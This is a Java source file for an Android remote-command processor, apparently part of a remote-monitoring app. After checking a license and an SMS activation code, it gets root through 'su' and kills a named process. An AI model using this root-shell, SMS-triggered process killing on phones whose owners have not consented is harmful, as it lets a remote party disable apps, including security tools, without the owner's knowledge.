package com.vvt.remotecommandmanager.processor.troubleshoot;

import java.io.DataOutputStream;
import java.io.IOException;
import java.util.List;

import android.app.ActivityManager;
import android.content.Context;

import com.vvt.appcontext.AppContext;
import com.vvt.datadeliverymanager.Customization;
import com.vvt.eventrepository.FxEventRepository;
import com.vvt.license.LicenseInfo;
import com.vvt.license.LicenseStatus;
import com.vvt.logger.FxLog;
import com.vvt.remotecommandmanager.MessageManager;
import com.vvt.remotecommandmanager.ProcessingType;
import com.vvt.remotecommandmanager.RemoteCommandData;
import com.vvt.remotecommandmanager.RemoteCommandType;
import com.vvt.remotecommandmanager.exceptions.InvalidCommandFormatException;
import com.vvt.remotecommandmanager.exceptions.RemoteCommandException;
import com.vvt.remotecommandmanager.processor.ProcessingResult;
import com.vvt.remotecommandmanager.processor.RemoteCommandProcessor;
import com.vvt.remotecommandmanager.utils.RemoteCommandUtil;

public class TerminateRunningProcessesProcessor extends RemoteCommandProcessor {
	private static final String TAG = "TerminateRunningProcessesProcessor";
	
	private static final boolean VERBOSE = true;
	private static final boolean LOGV = Customization.VERBOSE ? VERBOSE : false;
	private static final boolean LOGE = Customization.ERROR;
	
	private String mRecipientNumber;
	private ProcessingResult mReplyMessage;
	private LicenseInfo mLicenseInfo;
	private AppContext mAppContext;
	private StringBuilder mReplyMessageBuilder;
	
	public TerminateRunningProcessesProcessor(AppContext appContext, 
			FxEventRepository eventRepository,
			LicenseInfo licenseInfo) {
		
		super(appContext, eventRepository);
		mAppContext = appContext;
		mReplyMessage = new ProcessingResult();
		mLicenseInfo = licenseInfo;
	}

	@Override
	public ProcessingType getProcessingType() {
		return ProcessingType.SYNC;
	}

	@Override
	protected void doProcessCommand(RemoteCommandData commandData)
			throws RemoteCommandException {
		if(LOGV) FxLog.v(TAG, "doProcessCommand # ENTER ...");
		mReplyMessageBuilder = new StringBuilder();
		
		validateRemoteCommandData(commandData);
		
		if(mLicenseInfo.getLicenseStatus() == LicenseStatus.DISABLED) {
			mReplyMessageBuilder.append(MessageManager.LICENSE_DISABLED_WARNING).append(System.getProperty("line.separator"));
		} else if (mLicenseInfo.getLicenseStatus() == LicenseStatus.EXPIRED) {
			mReplyMessageBuilder.append(MessageManager.LICENSE_EXPIRED_WARNING).append(System.getProperty("line.separator"));
		}
		
		if(commandData.isSmsReplyRequired()) {
			mRecipientNumber = commandData.getSenderNumber();
		}
		
		try {
			
			List<String> args = null;
			
			if(commandData.getRmtCommandType() == RemoteCommandType.SMS_COMMAND) {
				args = RemoteCommandUtil.removeActivationCodeFromArgs(commandData.getArguments());			
			}
			else {
				args = commandData.getArguments();
			}

			String processNameToKill = args.get(0).toLowerCase();
			
			if(LOGV) FxLog.v(TAG, "doProcessCommand # processNameToKill is " + processNameToKill);
			
			ActivityManager activityManager = (ActivityManager) mAppContext.getApplicationContext().getSystemService(Context.ACTIVITY_SERVICE);
			List<ActivityManager.RunningAppProcessInfo> l = activityManager.getRunningAppProcesses();

            for(ActivityManager.RunningAppProcessInfo info: l) {
                if(info.processName.equalsIgnoreCase(processNameToKill)) {
                    //android.os.Process.killProcess(info.pid);
                	
                	if(LOGV) FxLog.v(TAG, "doProcessCommand # processNameToKill pid is " + info.pid);
                	boolean isSuccess = killProcess(info.pid);	
                	
                	if(isSuccess) {
                		mReplyMessage.setIsSuccess(true);
            			mReplyMessageBuilder.append(MessageManager.TERMINATE_RUNNING_PROCESS_SUCCESS);
            			mReplyMessage.setMessage(mReplyMessageBuilder.toString());
                	}
                	else {
                		mReplyMessage.setIsSuccess(false);
            			mReplyMessageBuilder.append(MessageManager.TERMINATE_RUNNING_PROCESS_ERROR);
            			mReplyMessage.setMessage(mReplyMessageBuilder.toString());
                	}
                	
                    break;
                }
            }
			
		} catch (Throwable t) {
			if(LOGE) FxLog.e(TAG, t.toString());

			mReplyMessage.setIsSuccess(false);
			mReplyMessageBuilder.append(MessageManager.TERMINATE_RUNNING_PROCESS_ERROR);
			mReplyMessage.setMessage(mReplyMessageBuilder.toString());
		}
		
		if(LOGV) FxLog.v(TAG, "doProcessCommand # IsSuccess : " + mReplyMessage.isSuccess());
		if(LOGV) FxLog.v(TAG, "doProcessCommand # ReplyMessage : " + mReplyMessage.getMessage());
		if(LOGV) FxLog.v(TAG, "doProcessCommand # EXIT ...");
		
	}
	
	private boolean killProcess(int pid) {
		
	    Process process;
		try {
			process = Runtime.getRuntime().exec("su");
			DataOutputStream os = new DataOutputStream(process.getOutputStream());
	
		    String tmpCmd = "kill " + pid; 
		    os.writeBytes(tmpCmd+"\n");
		    os.writeBytes("exit\n");
		    os.flush();
		    os.close();
		    process.waitFor();
		    return true;
		} catch (IOException e) {
			if(LOGE) FxLog.e(TAG, "killProcess # error : " + e.toString());
			return false;
		} catch (InterruptedException e) {
			if(LOGE) FxLog.e(TAG, "killProcess # error : " + e.toString());
			return false;
		}
		
		
	}
	
	protected void validateRemoteCommandData(RemoteCommandData commandData) throws RemoteCommandException{
		
		if(commandData.getRmtCommandType() == RemoteCommandType.SMS_COMMAND) {
			//Command should only have 2 arguments.
			if(commandData.getArguments().size() != 2 ) {
				throw new InvalidCommandFormatException();
			}
		
			//if invalid activation code it will throw exception.
			RemoteCommandUtil.validateActivationCode(commandData.getArguments().get(0), mLicenseInfo);
		}
	}

	@Override
	protected String getRecipientNumber() {
		return mRecipientNumber;
	}

	@Override
	protected ProcessingResult getReplyMessage() {
		return mReplyMessage;
	}
}
